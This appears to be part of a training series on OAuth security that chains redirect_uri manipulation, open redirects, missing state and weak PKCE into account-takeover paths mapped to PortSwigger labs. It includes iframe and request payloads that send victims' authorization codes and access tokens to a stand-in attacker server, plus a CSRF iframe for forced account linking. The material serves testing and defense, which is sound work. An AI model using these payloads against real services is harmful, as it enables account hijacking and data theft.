# Account Takeover via OAuth: Chaining the Full Attack Path

## Purpose of This File

Files 2 through 5 each isolated a single mechanism. In real assessments, the highest-severity findings almost never come from one isolated technique — they come from chaining two or three weaker findings together into full account takeover. This file walks through complete, realistic attack paths end to end, showing exactly which weakness from which prior file enables each step, and why the combination is more severe than the sum of its parts.

Prerequisite: all five previous files. This one assumes fluency with redirect_uri manipulation (File 2), state/CSRF (File 3), scope and leakage (File 4), and PKCE (File 5) and focuses entirely on how they combine.

---

## 1. Chain A: Redirect_uri Interception → Direct Account Takeover

This is the most direct chain and the one PortSwigger's **"OAuth account hijacking via redirect_uri"** lab is built around. Worth walking through completely since every other chain in this file is a variation on it.

**Step 1 — Recon:** identify that the client application accepts a modified `redirect_uri` (File 2, Section 2) — in the simplest case, no whitelist validation at all beyond the domain being *technically* different, or a whitelist bypassable via prefix/path techniques.

**Step 2 — Weaponize:** host a page that logs incoming requests, and construct the malicious authorization URL:

```html
<iframe src="https://oauth-authorization-server.com/auth?client_id=CLIENT_ID&redirect_uri=https://attacker-exploit-server.net/&response_type=code&scope=openid%20profile%20email"></iframe>
```

**Step 3 — Deliver:** get this page in front of the victim (File 2, Section 4) — an iframe on attacker infrastructure works silently if the victim already has an active session with the OAuth provider, which is the common case.

**Step 4 — Harvest:** the victim's browser completes the flow transparently. The authorization server redirects to the attacker's server with the code attached. The attacker's server logs the incoming request:

```
GET /?code=STOLEN_VICTIM_CODE HTTP/1.1
Host: attacker-exploit-server.net
```

**Step 5 — Redeem:** the attacker — from their own browser, with no victim involvement at this point — navigates directly to the legitimate client application's real callback URL, substituting the stolen code:

```
https://client-app.com/oauth-callback?code=STOLEN_VICTIM_CODE
```

**Why this completes the takeover:** the client application's backend performs the normal server-to-server token exchange (File 1, Step 4), using its own valid `client_secret` — the attacker never needed it. The authorization server has no way to know this redemption request originates from someone other than the original flow initiator, because nothing in the exchange proves that. The client application logs the attacker in as the victim and typically issues a session cookie for the victim's account directly to the attacker's browser.

**What would have stopped this chain:** a strict, exact-match redirect_uri whitelist (closing Step 1) *or* correctly enforced PKCE (File 5) — either one independently breaks this specific chain, which is exactly why defense-in-depth matters here. If only one of the two is present and correctly implemented, the chain fails at Step 5 even though Steps 1–4 still succeed in harvesting a code; the code is simply unredeemable without the matching verifier.

---

## 2. Chain B: Open Redirect Chaining → Token Theft → Resource Server Abuse

A longer chain building on File 2, Section 2.4/2.5 and File 4's leakage mechanics — the pattern behind **"Stealing OAuth access tokens via an open redirect"** and **"Stealing OAuth access tokens via a proxy page."**

**Step 1 — Recon the redirect_uri whitelist's real permissiveness:** confirm the whitelist accepts any path under the legitimate domain (File 2, Section 2.2), not just the exact registered callback.

**Step 2 — Recon the domain for a secondary leak point:** separately from the OAuth flow, audit the client application for an open redirect, an HTML injection point, or insecure `postMessage` handling reachable from a whitelisted path (File 2, Section 2.5).

**Step 3 — Chain them:** construct a `redirect_uri` that lands on the legitimate domain but routes — via path traversal or the open redirect itself — off-domain to attacker infrastructure:

```
GET /auth?client_id=CLIENT_ID&redirect_uri=https://client-app.com/oauth-callback/../post/next?path=https://attacker-exploit-server.net/collect&response_type=token&scope=openid%20profile%20email HTTP/1.1
Host: oauth-authorization-server.com
```

Note `response_type=token` — this targets the Implicit flow specifically, because the objective here is a **long-lived access token**, not a short-lived code, which changes what the attacker can do with it once captured (Step 5 below).

**Step 4 — Deliver and harvest** exactly as in Chain A — iframe delivery, victim's active OAuth session completes the flow silently, attacker's server logs the incoming request now carrying the token (fragment-to-query conversion via the client-side open redirect, per File 2 Section 2.4's explanation of why implementation detail matters here).

**Step 5 — Abuse the token directly, without ever touching the client application:** unlike a stolen authorization code, a stolen access token can be used **immediately and directly** against the resource server — no redemption step, no client_secret, no client application backend involved at all:

```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer STOLEN_VICTIM_TOKEN
```

**Step 6 — Optional scope elevation layered on top:** if the resource server has the scope validation gap from File 4, Section 1.3, the attacker can attempt to use the stolen token with an expanded scope request, potentially reaching data or actions beyond what the original consent screen showed the victim.

**Why this chain is worse than Chain A in one specific way:** because the compromise happens entirely at the resource-server level, the client application itself may have **no record** of this access ever occurring — no login event, no session created, nothing in its own audit logs, since the attacker never authenticated through the client application's normal login flow at all. This makes Chain B meaningfully harder to detect after the fact than Chain A, which at least creates a login event on the client application (even if attributed to the wrong actor).

---

## 3. Chain C: Missing State → Forced Profile Linking → Persistent Backdoor Access

Built directly from File 3's core mechanism, this chain is worth including separately because its **persistence** property makes it distinct in impact from Chains A and B, both of which are one-shot compromises tied to a single stolen code/token.

**Step 1 — Confirm the account-linking callback lacks session-bound state validation** (File 3, Sections 2 and 4).

**Step 2 — Attacker initiates their own linking flow** using their own OAuth-provider account, intercepting the resulting callback request before it completes:

```
GET /oauth-linking?code=ATTACKER_OWN_VALID_CODE HTTP/1.1
```

**Step 3 — Deliver this exact request to the victim** via an iframe, timed so the code is still valid:

```html
<iframe src="https://client-app.com/oauth-linking?code=ATTACKER_OWN_VALID_CODE"></iframe>
```

**Step 4 — The victim's active session on the client application completes the linking** — the client application attaches the attacker's social media identity to the victim's account, because the only signal it checked was "is there a logged-in session on this browser," not "did this session actually initiate this specific linking request."

**Why this chain is uniquely dangerous relative to Chains A and B:** the attacker now has a **standing, reusable** login path into the victim's account — they can log in via "Log in with social media" using their own, entirely legitimate social media credentials, at any time, indefinitely, until the victim notices the linked identity in their account settings and removes it (if the application even surfaces that clearly — many don't). Chains A and B require a fresh interception each time; Chain C requires exactly one successful CSRF delivery for permanent access. This is why File 3-class findings routinely get rated as severely as, or more severely than, the more technically involved chains in this file, despite requiring less sophistication to execute.

**Natural extension:** combine Step 4 with immediate privilege abuse — the PortSwigger lab this chain is drawn from specifically has the attacker use this newly established backdoor to reach an admin panel and delete another user, demonstrating that account-linking CSRF isn't just "log in as someone else" but a foothold for whatever further actions that account is authorized to perform.

---

## 4. Chain D: Cross-Direction Confusion — Using a Legitimate OAuth Feature Against Itself

A conceptual chain worth understanding even without a specific lab attached to it, because it comes up repeatedly in real-world assessments of applications with **both** a login-via-OAuth feature and a separate account-linking feature.

The core insight: these two features frequently share backend code (the same OAuth callback handler processes both "log me in" and "link this identity to my current session" requests, distinguished only by, say, a query parameter indicating flow type or by whether a session cookie happens to be present at request time). If that shared handler makes an assumption that holds for the login case but not the linking case — such as "if a session cookie is present, treat this as a linking request for that session's account, otherwise treat it as a fresh login" — an attacker can potentially force one code path to behave like the other by controlling exactly when, and with what cookies present, the victim's browser processes a given callback.

**Practical testing implication:** whenever you find a target with both login-via-OAuth and linking-via-OAuth, always test the linking endpoint's behavior when **no** session cookie is present (does it silently create a new account, or does it error out gracefully?), and test the login endpoint's behavior when a session cookie **is** present (does it correctly ignore any existing session and process a fresh login, or does it get confused and attempt to link to the existing session instead, becoming exploitable via Chain C's mechanism even though this endpoint was intended purely for login?). This kind of endpoint-confusion testing regularly surfaces vulnerabilities that neither endpoint exhibits when tested in isolation.

---

## 5. Chain Construction Checklist for Real Engagements

When assessing a real OAuth integration, work through this order — it mirrors the order of files in this series and reflects genuine attack-path priority:

1. **Map every OAuth-related endpoint** on the client application — not just the primary login callback, but any linking, re-authentication, or account-recovery flow that also uses OAuth. Chain C and Chain D both depend on finding a *secondary* flow that got less security attention than the primary login.
2. **Test redirect_uri validation strictness** (File 2) against every registered `client_id` you can identify — different client applications on the same authorization server sometimes have inconsistently enforced whitelists.
3. **Test state presence and session-binding** (File 3) on every OAuth-related endpoint identified in Step 1 independently — don't assume a protection confirmed on the login endpoint extends to the linking endpoint.
4. **Test PKCE enforcement** (File 5) — this determines whether a successful redirect_uri or leakage finding (Steps 2, and File 4) escalates all the way to Chain A/B-style full takeover, or is capped at a lower-severity "code interception without redemption" finding.
5. **Audit for secondary leak points** on any domain that passes redirect_uri validation (File 2 Section 2.5, File 4 Part 2) — open redirects, HTML injection, insecure postMessage, third-party resource loads on callback pages.
6. **Document the full chain, not just the entry point**, when writing up findings — a report that says "redirect_uri accepts external domains" is a moderate finding; a report that walks through Steps 1–5 above to a demonstrated account takeover is a critical one, and the difference in how it's written is often the difference in how it's triaged.

---

## 6. PortSwigger Lab Mapping (Full Chains)

| Difficulty | Lab | Chain in this file it corresponds to |
|---|---|---|
| Apprentice | **Authentication bypass via OAuth implicit flow** | Not a chain covered above directly — this lab (File 1, Section 3) is the standalone client-side trust failure, worth solving first as a warm-up before attempting the chains in this file |
| Practitioner | **Forced OAuth profile linking** | Chain C |
| Practitioner | **OAuth account hijacking via redirect_uri** | Chain A |
| Expert | **Stealing OAuth access tokens via an open redirect** | Chain B (open-redirect variant) |
| Expert | **Stealing OAuth access tokens via a proxy page** | Chain B (HTML-injection / proxy-page variant) |

**Adjacent but out of this series' core scope:** PortSwigger also maintains a **"SSRF via OpenID dynamic client registration"** lab under this same topic area. It's an OpenID Connect-specific vulnerability (abusing dynamic client registration to register a malicious `logo_uri` or similar that the server fetches server-side) rather than an OAuth authentication-flow attack in the sense this series covers, so it isn't chained above — but it's worth knowing it exists if you're working through PortSwigger's OAuth authentication topic labs in full, since it sits in the same lab list. Consider it a natural bridge topic if this series' companion SSRF notes get extended to cover OIDC-specific SSRF vectors.

**Honest gap disclosure:** Chain D in this file is a conceptual/testing-methodology chain built from first principles about how shared OAuth callback handlers can misbehave — I'm not aware of a PortSwigger lab built specifically around endpoint-confusion between a login flow and a linking flow. It's included because it's a realistic pattern worth testing for on real engagements, not because there's a lab to practice it against. As with every lab table in this series, confirm the current lab count at `portswigger.net/web-security/all-labs` before treating this table as complete — PortSwigger updates this topic periodically.

---

## Real-World Industry Note

The single highest-leverage habit for OAuth testing on real bug bounty targets: never stop at the first weakness you confirm. A redirect_uri bypass that looks capped at "code interception, but PKCE seems present" is worth the extra ten minutes to actually test whether that PKCE is enforced correctly (File 5) before writing it up as a lower-severity finding — the gap between "interesting but capped" and "full account takeover" in OAuth testing is very often exactly one more chained step away, and triagers reward reports that demonstrate the complete chain far more than reports that stop at the first plausible-looking weakness.

---

## What's Next

File 7 is the condensed cheatsheet — every parameter, bypass technique, and detection test from Files 1 through 6, organized for fast reference during an active engagement rather than for learning the mechanism from scratch.
